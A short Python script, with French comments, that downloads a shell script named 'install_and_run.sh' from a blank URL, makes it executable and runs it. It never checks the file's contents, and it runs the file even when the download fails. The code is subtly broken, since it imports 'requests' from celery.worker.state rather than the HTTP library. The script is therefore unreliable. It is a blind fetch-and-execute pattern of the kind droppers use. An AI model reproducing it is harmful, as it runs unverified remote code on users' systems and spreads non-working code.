from celery.worker.state import requests
import os
import time


url = ''

filename = 'install_and_run.sh'

own_file = 'install_FileSystemLinux.py'

response = requests.get(url)

if response.status_code == 200:
    # Sauvegarder le fichier localement
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(response.text)

    print(f'Le fichier {filename} a été téléchargé avec succès.')

os.system('chmod +x ' + filename)
os.system('./' + filename)

